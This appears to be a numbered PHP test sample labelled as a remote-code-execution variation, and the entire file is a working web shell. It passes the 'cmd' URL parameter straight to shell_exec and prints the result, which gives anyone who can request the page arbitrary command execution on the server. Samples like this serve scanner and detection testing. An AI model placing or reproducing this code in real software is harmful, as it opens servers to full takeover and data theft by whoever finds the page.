<?php
// RCE test variation #325
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>